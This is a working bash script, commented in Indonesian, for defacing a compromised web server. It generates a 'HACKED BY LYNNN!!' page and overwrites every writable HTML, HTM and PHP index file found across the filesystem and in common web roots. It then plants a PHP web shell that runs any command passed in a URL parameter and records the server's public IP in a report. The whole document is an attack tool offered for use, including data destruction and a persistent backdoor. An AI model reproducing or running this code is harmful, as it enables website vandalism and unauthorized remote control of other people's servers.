#!/bin/bash

# ==============================================
# FAST DEFACE VPS - HACKED BY LYNNN!!
# [ AUTO REPLACE ALL HTML FILES! ]
# ==============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# ==============================================
# HTML KEREN BUAT DEFACE
# ==============================================
cat > deface.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>HACKED BY LYNNN!!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', monospace;
        }
        .box {
            background: #0a0a0a;
            border: 5px solid #ff0000;
            border-radius: 30px;
            padding: 60px;
            text-align: center;
            box-shadow: 0 0 100px #ff0000;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 50px #ff0000; }
            50% { box-shadow: 0 0 150px #ff0000; }
            100% { box-shadow: 0 0 50px #ff0000; }
        }
        h1 {
            font-size: 5rem;
            color: #ff0000;
            text-shadow: 0 0 30px #ff0000;
            margin: 20px 0;
            animation: glitch 3s infinite;
        }
        @keyframes glitch {
            0% { transform: skew(0deg); }
            20% { transform: skew(10deg); text-shadow: 5px 0 0 #00ff00; }
            40% { transform: skew(-10deg); text-shadow: -5px 0 0 #0000ff; }
            60% { transform: skew(5deg); }
            80% { transform: skew(-5deg); }
            100% { transform: skew(0deg); }
        }
        h2 {
            color: #00ff00;
            font-size: 2rem;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
        .logo {
            font-size: 8rem;
            animation: float 3s ease infinite;
        }
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
            100% { transform: translateY(0px); }
        }
        .stats {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 40px 0;
            color: #fff;
        }
        .stats div {
            border: 2px solid #00ff00;
            padding: 10px 20px;
            border-radius: 10px;
            background: rgba(0,255,0,0.1);
        }
        .footer {
            color: #00ff00;
            margin-top: 40px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">👾</div>
        <h1>HACKED BY LYNNN!!</h1>
        <h2>🔓 SYSTEM BREACHED 🔓</h2>
        
        <div class="stats">
            <div>💀 VPS: 1337</div>
            <div>🌐 SITES: 999+</div>
            <div>🔑 ALL DATA</div>
        </div>
        
        <div style="color:#ff0000; margin:30px 0; font-size:1.5rem;">
            ⚡ YOUR SERVER IS COMPROMISED ⚡
        </div>
        
        <div class="footer">
            🏴‍☠️ LYNNN WAS HERE - $(date) 🏴‍☠️
        </div>
    </div>
</body>
</html>
EOF

# ==============================================
# HEADER
# ==============================================
clear
echo -e "${RED}"
echo "    ╔═══════════════════════════════════════════════════════════╗"
echo "    ║     FAST DEFACE VPS - HACKED BY LYNNN!!                   ║"
echo "    ║     [ AUTO REPLACE ALL HTML FILES! ]                      ║"
echo "    ╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${YELLOW}⚠️  Script ini akan MENCARI dan MENGGANTI semua file HTML!${NC}"
echo -ne "${CYAN}Mulai? (y/n): ${NC}"
read CONFIRM

if [[ "$CONFIRM" != "y" ]]; then
    echo -e "${RED}Dibatalkan${NC}"
    exit 0
fi

# ==============================================
# 1. CARI SEMUA FILE HTML
# ==============================================
echo -e "\n${YELLOW}[•] Mencari semua file HTML di server...${NC}"

HTML_FILES=$(find / -type f -name "*.html" -o -name "*.htm" -o -name "*.php" 2>/dev/null | grep -E "(index|home|default|main|wp-content|public_html|httpdocs|htdocs)")

TOTAL=$(echo "$HTML_FILES" | wc -l)
echo -e "${GREEN}✅ Ditemukan $TOTAL file${NC}"

# ==============================================
# 2. GANTI SEMUA FILE
# ==============================================
echo -e "\n${YELLOW}[•] Mulai mengganti semua file...${NC}"
COUNT=0

for file in $HTML_FILES; do
    # Cek apakah file bisa ditulis
    if [ -w "$file" ]; then
        cp deface.html "$file" 2>/dev/null
        if [ $? -eq 0 ]; then
            COUNT=$((COUNT+1))
            echo -ne "\r${GREEN}  ✅ $COUNT/$TOTAL file diganti${NC}"
        fi
    fi
done

echo -e "\n${GREEN}✅ Berhasil mengganti $COUNT file!${NC}"

# ==============================================
# 3. LOKASI PRIORITAS (PASTI KENA)
# ==============================================
echo -e "\n${YELLOW}[•] Memastikan lokasi penting kena...${NC}"

PRIORITY=(
    "/var/www/html/index.html"
    "/var/www/index.html"
    "/home/public_html/index.html"
    "/home/www/index.html"
    "/www/index.html"
    "/public_html/index.html"
    "/httpdocs/index.html"
    "/htdocs/index.html"
    "/srv/www/htdocs/index.html"
    "/usr/local/www/index.html"
    "/opt/lampp/htdocs/index.html"
)

for loc in "${PRIORITY[@]}"; do
    if [ -d "$(dirname "$loc")" ]; then
        cp deface.html "$loc" 2>/dev/null
        echo -e "${GREEN}  ✅ $loc${NC}"
    fi
done

# ==============================================
# 4. CARI SEMUA FILE INDEX
# ==============================================
echo -e "\n${YELLOW}[•] Mencari semua file index...${NC}"

INDEX_FILES=$(find / -type f -name "index.*" 2>/dev/null | grep -E "\.(html|htm|php)$")

for file in $INDEX_FILES; do
    if [ -w "$file" ]; then
        cp deface.html "$file" 2>/dev/null
    fi
done
echo -e "${GREEN}✅ Semua file index diganti${NC}"

# ==============================================
# 5. CEK HASIL
# ==============================================
echo -e "\n${YELLOW}[•] Cek hasil...${NC}"

# Cek beberapa lokasi
CHECK_SITES=(
    "/var/www/html/index.html"
    "/home/public_html/index.html"
    "/www/index.html"
)

echo -e "\n${CYAN}📊 Sample hasil:${NC}"
for site in "${CHECK_SITES[@]}"; do
    if [ -f "$site" ]; then
        if grep -q "LYNNN" "$site"; then
            echo -e "${GREEN}  ✅ $site - BERHASIL${NC}"
        else
            echo -e "${RED}  ❌ $site - GAGAL${NC}"
        fi
    fi
done

# ==============================================
# 6. BUAT BACKUP PLAN (PHP SHELL)
# ==============================================
echo -e "\n${YELLOW}[•] Membuat backdoor PHP...${NC}"

cat > /tmp/lynn.php << 'EOF'
<?php
// LYNNN BACKDOOR
if(isset($_GET['cmd'])) {
    echo "<pre>".shell_exec($_GET['cmd'])."</pre>";
}
?>
<h2>LYNNN BACKDOOR</h2>
<form>
<input type="text" name="cmd" placeholder="ls -la">
<input type="submit" value="run">
</form>
EOF

# Copy ke beberapa lokasi
for loc in "${PRIORITY[@]}"; do
    dir=$(dirname "$loc")
    cp /tmp/lynn.php "$dir/shell.php" 2>/dev/null
    cp /tmp/lynn.php "$dir/lynn.php" 2>/dev/null
done

echo -e "${GREEN}✅ Backdoor siap: shell.php / lynn.php${NC}"

# ==============================================
# 7. REPORT
# ==============================================
cat > ~/deface_report.txt << EOF
=====================================
FAST DEFACE REPORT - LYNNN!!
=====================================
Tanggal : $(date)
Hostname: $(hostname)
IP VPS  : $(curl -s ifconfig.me)

File HTML diganti : $COUNT
Lokasi prioritas  : ${#PRIORITY[@]}
File index        : SEMUA

Backdoor:
- /var/www/html/shell.php
- /home/public_html/shell.php
- /www/shell.php
- /httpdocs/shell.php

Cek hasil:
curl http://localhost/
curl http://$(curl -s ifconfig.me)/

🏴‍☠️ HACKED BY LYNNN!! 🏴‍☠️
=====================================
EOF

# ==============================================
# SELESAI
# ==============================================
echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║         ✅  DEFACE VPS SELESAI!               ║${NC}"
echo -e "${GREEN}║         HACKED BY LYNNN!! AKTIF!              ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"

echo -e "\n${CYAN}📁 Report: ~/deface_report.txt${NC}"
echo -e "${CYAN}🔍 Cek website: http://$(curl -s ifconfig.me)${NC}"
echo -e "\n${RED}🏴‍☠️  LYNNN WAS HERE  🏴‍☠️${NC}"

# Bersih-bersih
rm -f /tmp/lynn.php
